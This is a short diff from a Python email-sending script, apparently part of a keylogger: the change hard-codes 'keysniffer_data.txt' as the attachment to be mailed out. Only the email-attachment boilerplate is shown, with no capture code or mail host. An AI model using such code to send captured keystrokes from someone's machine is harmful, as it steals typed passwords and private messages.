@@ -62,7 +62,8 @@ body = "Body_of_the_mail"
 msg.attach(MIMEText(body, "plain"))
 
 # open the file to be sent
-attachment = open(__path__, "rb")
+filename = "keysniffer_data.txt"
+attachment = open("keysniffer_data.txt", "rb")
 
 # instance of MIMEBase and named as p
 p = MIMEBase("application", "octet-stream")
